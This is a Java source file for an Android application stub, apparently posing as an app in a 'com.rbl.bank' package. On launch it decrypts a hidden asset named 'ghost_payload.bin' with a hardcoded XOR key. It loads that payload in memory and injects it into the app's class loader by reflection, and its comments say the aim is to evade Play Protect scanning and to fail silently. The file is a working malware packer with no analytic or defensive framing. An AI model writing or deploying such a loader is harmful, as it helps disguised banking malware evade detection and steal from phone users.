package com.rbl.bank;

import android.app.Application;
import android.content.Context;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import dalvik.system.InMemoryDexClassLoader;
import dalvik.system.PathClassLoader;

public class StubApplication extends Application {
    private static final String ENCRYPTED_DEX_FILE = "ghost_payload.bin";
    private static final int[] DECRYPT_KEY = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        try {
            // Read encrypted payload from assets
            InputStream in = base.getAssets().open(ENCRYPTED_DEX_FILE);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] b = new byte[1024];
            int read;
            while ((read = in.read(b)) != -1) {
                out.write(b, 0, read);
            }
            byte[] encPayload = out.toByteArray();
            in.close();

            // Decrypt payload in memory
            for (int i = 0; i < encPayload.length; i++) {
                encPayload[i] = (byte) (encPayload[i] ^ DECRYPT_KEY[i % DECRYPT_KEY.length]);
            }

            // Load decrypted DEX entirely in-memory (bypassing disk scans like Play Protect)
            ByteBuffer dexBuffer = ByteBuffer.wrap(encPayload);
            InMemoryDexClassLoader memoryLoader = new InMemoryDexClassLoader(dexBuffer, getClassLoader());

            // Reflection to inject our loaded DEX into the running Application's ClassLoader path
            injectDexElements(getClassLoader(), memoryLoader);

        } catch (Exception e) {
            // Silently fail if something goes wrong, acting like a normal crash without logging sensitive stack traces
            e.printStackTrace();
        }
    }

    private void injectDexElements(ClassLoader targetLoader, ClassLoader sourceLoader) throws Exception {
        Object targetPathList = getPathList(targetLoader);
        Object sourcePathList = getPathList(sourceLoader);

        Object targetDexElements = getDexElements(targetPathList);
        Object sourceDexElements = getDexElements(sourcePathList);

        // Combine the dexElements arrays placing our source (payload) items first
        Object combinedElements = combineArrays(sourceDexElements, targetDexElements);

        // Set the modified dexElements back into the Application classloader
        setField(targetPathList, targetPathList.getClass(), "dexElements", combinedElements);
    }

    private Object getPathList(Object baseDexClassLoader) throws Exception {
        return getField(baseDexClassLoader, Class.forName("dalvik.system.BaseDexClassLoader"), "pathList");
    }

    private Object getDexElements(Object paramObject) throws Exception {
        return getField(paramObject, paramObject.getClass(), "dexElements");
    }

    private Object getField(Object obj, Class<?> cl, String field) throws Exception {
        Field localField = cl.getDeclaredField(field);
        localField.setAccessible(true);
        return localField.get(obj);
    }

    private void setField(Object obj, Class<?> cl, String field, Object value) throws Exception {
        Field localField = cl.getDeclaredField(field);
        localField.setAccessible(true);
        localField.set(obj, value);
    }

    private Object combineArrays(Object array1, Object array2) {
        Class<?> localClass = array1.getClass().getComponentType();
        int i = Array.getLength(array1);
        int j = i + Array.getLength(array2);
        Object result = Array.newInstance(localClass, j);
        for (int k = 0; k < j; k++) {
            if (k < i) {
                Array.set(result, k, Array.get(array1, k));
            } else {
                Array.set(result, k, Array.get(array2, k - i));
            }
        }
        return result;
    }
}
